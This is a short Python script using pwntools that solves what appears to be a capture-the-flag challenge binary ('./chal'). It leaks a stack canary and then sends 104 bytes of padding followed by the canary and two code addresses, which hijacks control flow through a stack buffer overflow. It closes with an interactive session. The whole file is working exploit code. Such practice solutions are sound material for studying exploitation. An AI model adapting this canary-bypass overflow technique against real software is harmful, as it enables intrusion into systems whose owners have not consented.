from pwn import *
context.log_level ='debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.arch = 'amd64'
p = process("./chal")
gdb.attach(p)
p.sendline(b"13")

canary = int(p.readline(),16)

payload = flat([canary,0xdeadbeef,0x040101a,0x4011b6])
p.send(b"A"*104+payload)
p.interactive()